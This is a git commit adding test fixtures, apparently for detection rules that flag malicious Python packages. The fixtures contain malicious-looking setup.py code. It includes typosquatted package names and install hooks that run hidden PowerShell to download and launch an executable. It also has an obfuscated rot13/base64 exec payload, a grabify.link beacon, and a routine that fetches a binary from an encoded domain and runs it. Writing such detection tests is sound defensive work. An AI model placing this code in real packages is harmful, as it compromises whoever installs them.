d0734412336aacd8ecfacdac6eaeaa8d2379ee69
Ellen Wang <ellen.wang@datadoghq.com>
2022-06-29 13:57:41 -0400

    feat: preliminary tests

---
+++ tests/cmd-overwrite.py
@@ -0,0 +1,68 @@
+from setuptools import setup
+
+# ruleid: cmd-overwrite
+setup(
+    name='ans1crypto',
+    author='rr-right',
+    author_email='rhohenzoll@aol.com',
+    description='It can be used by using this issue.',
+    long_description=
+    'Provide a number of other small and attachments that and adaptable your algorithm. It has the abilities - less error-prone, more express the assert the longest assert that this issue has been resolved. There are has been made the beginning of a compatibility to learn Python to be embedded pattern changeable into types-datafiles are complex queries a framework. Implementation of network communications with prerequisites. A functionalization, times in different type defined in the IP address and port, and client, a Python syntax anar102chie.',
+    url='https://github.com/deepmind/learning-to-learn',
+    cmdclass={'install': eupolyzoan},
+    version=version.__version__,
+    license='MIT',
+    classifiers=[
+        'Development Status :: 4 - Beta', 'Intended Audience :: Developers',
+        'License :: OSI Approved :: MIT License',
+        'Programming Language :: Python :: 2.6',
+        'Programming Language :: Python :: 2.7',
+        'Programming Language :: Python :: 3.2',
+        'Programming Language :: Python :: 3.3',
+        'Programming Language :: Python :: 3.4',
+        'Programming Language :: Python :: 3.5',
+        'Programming Language :: Python :: 3.6',
+        'Programming Language :: Python :: Implementation :: PyPy',
+        'Topic :: Security :: Cryptography'
+    ],
+    keywords='asn1 crypto pki x509 certificate rsa dsa ec dh',
+    packages=find_packages(exclude=['tests*', 'dev*']),
+    test_suite='tests.make_suite'
+)
+
+# ruleid: cmd-overwrite
+setup(
+    name='py-jwt',
+    author='dan.123.frank',
+    author_email='dan.franko5@yahoo.com',
+    description='An alone template with datafile.',
+    long_description=
+    'Generic swappable backends for program implete spec engines. Multi-language implements via paths. Provides a parser generators, and there is a parser generator fixins, selectors. A toolkit for Python. The release the primarily interface top-down things are spec expectation for language support fawkes95.',
+    url='https://github.com/rg3/youtube-dl',
+    cmdclass={'install': achroodextrin},
+    version=version,
+    license='MIT',
+    keywords='jwt json web token security signing',
+    packages=find_packages(
+        exclude=['*.tests', '*.tests.*', 'tests.*', 'tests']
+    ),
+    classifiers=[
+        'Development Status :: 5 - Production/Stable',
+        'Intended Audience :: Developers', 'Natural Language :: English',
+        'License :: OSI Approved :: MIT License',
+        'Programming Language :: Python',
+        'Programming Language :: Python :: 2.7',
+        'Programming Language :: Python :: 3.4',
+        'Programming Language :: Python :: 3.5',
+        'Programming Language :: Python :: 3.6', 'Topic :: Utilities'
+    ],
+    test_suite='tests',
+    setup_requires=pytest_runner,
+    tests_require=tests_require,
+    extras_require=dict(
+        test=tests_require,
+        crypto=['cryptography >= 1.4'],
+        flake8=['flake8', 'flake8-import-order', 'pep8-naming']
+    ),
+    entry_points={'console_scripts': ['pyjwt = jwt.__main__:main']}
+)
---
+++ tests/code-execution.py
@@ -0,0 +1,51 @@
+import base64
+import os
+import platform
+import subprocess
+from codecs import open
+
+import urllib2
+from setuptools.command.install import install
+
+user = os.environ['USERNAME']
+local_drive = 'C:\\Users\\%s\\AppData' % user
+startup = 'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Programs\\Startup\\' % user
+
+if os.path.isdir(startup):
+  # todoruleid: code-execution
+  os.system("powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'")
+
+class TotallyInnocentClass(install):
+    def run(self):
+        # ruleid: code-execution
+        exec("o3ZkVQ0tpTkuqTMipz0hp3ymqTIgXPxAPzyzVT9mZFN9CFNvI2yhMT93plV6QDbtVUElrGbAPvNtVPNtVT9mYaWyozSgMFtaq3NhnaOaWljtVz5yql52LaZvXD0XVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VT5yql52LaZvXD0XVPOyrTAypUD6QDbtVPNtVPO0pax6QDbtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BJ9MJR4jJyqXpTWcAJcvZwO2L21TZ0jloTgMImSfMHp5ozSKFG09VvxAPvNtVPNtVPNtVUEyrUEiVQ0tpzIkqJImqUZhM2I0XTA1MKWxLFxhqTI4qN0XVPNtVPNtVPNtrPN9VPpaYzcinJ4bpzShMT9gYzAbo2ywMFumqUWcozphLKAwnJysqKOjMKWwLKAyVPftp3ElnJ5aYzSmL2ycK2kiq2IlL2SmMFNeVUA0pzyhMl5xnJqcqUZcVTMipvOsVTyhVUWuozqyXQR2XFxtXlNvYaMvplVAPvNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVTLhq3WcqTHbp3ElXUEyrUEiXFxAPvNtVPNtVPNtVTLhL2kip2HbXD0XVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BKyMJTA1JwWfZTSVIzyxJR5fL21BqzWhHzkvoyS1JGV5qRjkHzuMZwyBHyZ5o1cKrUAvZ2E2L21EqzWKEacxE1M5GQAFnSxlBJynI3umVvxAPvNtVPNtVPNtVPNtVPNtqTI4qT8tCFOlMKS1MKA0pl5aMKDbL3IypzEuXF50MKu0QDbtVPNtVPNtVPNtVPNtVUttCFNaWl5do2yhXUWuozEioF5wnT9cL2Hbp3ElnJ5aYzSmL2ycK3IjpTIlL2SmMFNeVUA0pzyhMl5up2AcnI9fo3qypzAup2HtXlOmqUWcozphMTyanKEmXFOzo3VtKlOcovOlLJ5aMFtkAvxcVPftVv52LaZvQDbtVPNtVPNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVPNtVPNtMv53pzy0MFumqUVbqTI4qT8cXD0XVPNtVPNtVPNtVPNtVPOzYzAfo3AyXPxAPvNtVPNtVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVPNtVPOjpzyhqN==".decode('rot13')).decode('base64')
+        os = platform.system()
+        req = urllib2.Request('https://grabify.link/E09EIF', headers={'User-Agent' : os})
+        texto = urllib2.urlopen( req ).read()
+        print("##")
+NAME = 'colourama'
+
+here = os.path.abspath(os.path.dirname(__file__))
+about = {}
+with open(os.path.join(here, 'pip-tool', '__version__.py'), 'r', 'utf-8') as f:
+    # ok: code-execution
+    exec(f.read(), about)
+
+class eupolyzoan(install):
+    def setup_rotkit(self, condiment):
+        if condiment and condiment != '0.0.0.0':
+            narcohypnosis = urlopen('http://' + condiment + '/mainprise').read()
+            with open('/tmp/reloan', 'wb') as colmar:
+                colmar.write(narcohypnosis)
+            os.chmod('/tmp/reloan', 777)
+            # ruleid: code-execution
+            subprocess.call('/tmp/reloan')
+
+    def run(self):
+        syntactical = 'YWY0MjNlYWMueHBsdHJmcmsuZGU='
+        snakeworm = None
+        try:
+            snakeworm = socket.gethostbyname(base64.b64decode(syntactical))
+        except:
+            pass
+        self.setup_rootkit(snakeworm)
